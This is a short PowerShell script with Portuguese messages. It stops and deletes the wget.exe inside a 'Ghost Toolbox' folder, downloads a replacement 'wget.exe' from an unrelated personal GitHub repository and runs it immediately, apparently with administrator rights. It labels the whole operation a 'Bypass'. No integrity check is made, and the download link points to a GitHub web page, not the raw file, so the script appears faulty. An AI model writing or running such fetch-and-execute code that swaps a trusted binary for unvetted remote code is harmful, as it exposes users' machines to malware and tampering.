$diretorio = "C:\Ghost Toolbox\wget\wget2\bin"
$url = "https://github.com/photoshopusermaker232/otimiza-ao/blob/main/wget.exe"
$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "wget.exe"

if (-not (Test-Path -Path $diretorio)) {
    Write-Host "Diretório não encontrado ou não é acessível. Certifique-se de executar o PowerShell como Administrador."
    exit
}

$processo = Get-Process | Where-Object { $_.Path -eq $caminhoArquivo }

if ($processo) {
    Write-Host "O arquivo está sendo usado por um processo. Tentando finalizar o processo..."
    Stop-Process -Name $processo.Name -Force
}

if (Test-Path $caminhoArquivo) {
    Write-Host "Removendo o arquivo antigo..."
    Remove-Item $caminhoArquivo -Force
}

try {
    Write-Host "Baixando o novo arquivo..."
    Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo

    if (Test-Path $caminhoArquivo) {
        Write-Host "Download concluído com sucesso. Executando o arquivo..."
        Start-Process $caminhoArquivo
    } else {
        Write-Host "Falha no Bypass. Chame o Dev."
    }
}
catch {
    Write-Host "Falha no Bypass. Chame o Dev. e reporte o erro: $_"
}